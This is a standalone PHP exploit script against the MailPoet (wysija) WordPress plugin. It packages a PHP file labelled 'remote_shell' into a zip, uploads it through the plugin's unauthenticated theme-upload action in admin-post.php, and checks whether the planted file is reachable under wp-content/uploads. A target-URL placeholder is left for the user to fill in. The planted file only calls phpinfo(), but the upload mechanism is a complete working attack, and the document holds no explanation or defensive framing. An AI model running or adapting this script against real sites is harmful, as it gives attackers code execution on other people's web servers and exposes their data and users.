<?php

$siteURL = 'http://YOUR-TARGET-SITE-dot-com/';
$url = $siteURL . 'wp-admin/admin-post.php?page=wysija_campaigns&action=themes';
//$url = 'http://127.0.0.1:8033/wp-admin/admin-post.php?page=wysija_campaigns&action=themes';

$tmpZipFile = sys_get_temp_dir() . '/mailpoet.zip';
if (file_exists($tmpZipFile)) {
	unlink($tmpZipFile);
}

$zip = new ZipArchive();
$zip->open($tmpZipFile, ZipArchive::CREATE);
$shellName = 'remote_shell.' . time() . '.php';
$zip->addFromString('mailpoet/' . $shellName, '<?php phpinfo(); ?>');
$zip->addFromString('mailpoet/style.css', '/* Theme Name: none */');
$zip->close();

echo "[*] Attempting to drop in shell " . $shellName . "\n";

$payloadFile = new CURLFile($tmpZipFile, 'application/zip', basename($tmpZipFile));

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array(
	'overwriteexistingtheme' => 'on',
	'action'                 => 'themeupload',
	'submitter'              => 'Upload',
	'page'                   => 'HzGGCThAke',
	'my-theme'               => $payloadFile,
));
//curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies.' . uniqid() . '.txt');
//curl_setopt($ch, CURLOPT_COOKIE, "XDEBUG_SESSION=netbeans-xdebug");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);

echo "[*] Uploading shell to MailPoet.\n";
$result = curl_exec($ch);
$statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$shellURL = $siteURL . 'wp-content/uploads/wysija/themes/mailpoet/' . $shellName;

echo "[*] Checking shell URL for 200.\n";

$ch = curl_init($shellURL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");
$result = curl_exec($ch);
$statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

curl_close($ch);

if ($statusCode === 200) {
	echo "[+] Success! Shell found at $shellURL.\n";
} else {
	echo "[-] Shell not found at $shellURL.\n";
}
